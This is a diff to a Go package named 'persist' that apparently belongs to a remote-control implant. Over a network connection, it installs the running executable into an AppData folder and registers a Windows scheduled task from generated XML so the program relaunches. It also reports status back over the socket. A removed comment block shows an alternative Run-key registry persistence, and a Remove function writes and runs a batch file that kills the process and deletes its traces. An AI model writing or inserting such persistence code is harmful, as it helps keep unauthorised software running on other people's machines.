@@ -2,8 +2,6 @@ package persist
 
 import (
 	"bufio"
-	"bytes"
-
 	//"bytes"
 	"fmt"
 	"log"
@@ -26,18 +24,22 @@ func Schedule(connection net.Conn) (err error) {
 	exe_name := filepath.Base(os.Args[0])
 	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
 	appdata := filepath.Join(home, "AppData\\Roaming", without_ext)
-	appdata_with_exe := appdata + "\\" + exe_name
 	xml_path := appdata + "\\schtask.xml"
+	folder_path := filepath.Join(home, "AppData\\Roaming", without_ext)
 
-	fmt.Println("appdata : ", appdata)
-	fmt.Println("exe_name : ", exe_name)
-	fmt.Println("appdata_with_exe : ", appdata_with_exe)
-	fmt.Println("without_exe : ", without_ext)
-	fmt.Println("xml_path : ", xml_path)
+	if _, err := os.Stat(folder_path); os.IsNotExist(err) {
+		e := os.Mkdir(without_ext, 0755) //mkdir jack
+		if e != nil {
+			panic(e)
+		}
+		goto ELSE
+	}
+	goto ELSE
 
-	appdata_cd_command := os.Chdir(filepath.Join(home, "AppData\\Roaming", without_ext))
-	if appdata_cd_command != nil {
-		panic(appdata_cd_command)
+ELSE:
+	c1 := os.Chdir(folder_path) //cd appdata/Roaming/jack
+	if c1 != nil {
+		panic(c1)
 	}
 
 	xml_data := "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
@@ -81,7 +83,7 @@ func Schedule(connection net.Conn) (err error) {
 		"\n  </Settings>" +
 		"\n  <Actions Context=\"Author\">" +
 		"\n    <Exec>" +
-		"\n      <Command>" + appdata_with_exe + "</Command>" +
+		"\n      <Command>" + filepath.Join(folder_path, exe_name) + "</Command>" +
 		"\n    </Exec>" +
 		"\n  </Actions>" +
 		"\n</Task>"
@@ -103,30 +105,11 @@ func Schedule(connection net.Conn) (err error) {
 		fmt.Println("Error: ", err)
 	}
 
-	fmt.Println("powershell", "schtasks", "/DELETE", "/TN", without_ext, "/F")
-
-	c1 := exec.Command("powershell", "Copy-Item", os.Args[0], appdata)
-	if err := c1.Run(); err != nil {
-		fmt.Println("Error: ", err)
-	}
-
-	fmt.Println("C1", "powershell", "Copy-Item", os.Args[0], appdata)
-
 	c2 := exec.Command("powershell", "SCHTASKS", "/create", "/TN", without_ext, "/xml", xml_path)
 	if err := c2.Run(); err != nil {
 		fmt.Println("Error: ", err)
 	}
 
-	fmt.Println("C2 : ", "powershell", "SCHTASKS", "/create", "/TN", without_ext, "/xml", xml_path)
-
-	/*
-		c3 := exec.Command("powershell", "reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Start", "/t", "REG_SZ", "/d", "\""+file_loc+"\"", "/f")
-		if err := c3.Run(); err != nil {
-			fmt.Println("Error: ", err)
-		}
-
-		fmt.Println("powershell", "reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Start", "/t", "REG_SZ", "/d", "\""+file_loc+"\"", "/f")
-	*/
 	nbytes, err := connection.Write([]byte("[#] xml written\n"))
 	if err != nil {
 		panic(err)
@@ -148,6 +131,7 @@ func Remove(connection net.Conn) (err error) {
 	content := "powershell -command \"Start-Sleep -s 5\"" + "\n" +
 		"schtasks /DELETE /TN " + without_ext + " /F" + "\n" +
 		"taskkill /im " + exe_name + " /f" + "\n" +
+		"Start-Sleep -s 10" + "\n" +
 		"del " + appdata + "/f /q"
 
 	file, err := os.Create("uninstall.bat")
@@ -162,15 +146,13 @@ func Remove(connection net.Conn) (err error) {
 	}
 	err = file.Close()
 
-	cmd := exec.Command("powershell", "./uninstall.bat")
-	var out bytes.Buffer
-	var stderr bytes.Buffer
-	cmd.Stdout = &out
-	cmd.Stderr = &stderr
-	error := cmd.Run()
-	if error != nil {
-		fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
+	c2 := exec.Command("powershell", "Start-Sleep", "-Seconds", "5", ";", "./uninstall.bat")
+	if err := c2.Run(); err != nil {
+		fmt.Println("Error: ", err)
 	}
-
 	return
+}
+
+func disarm() {
+
 }
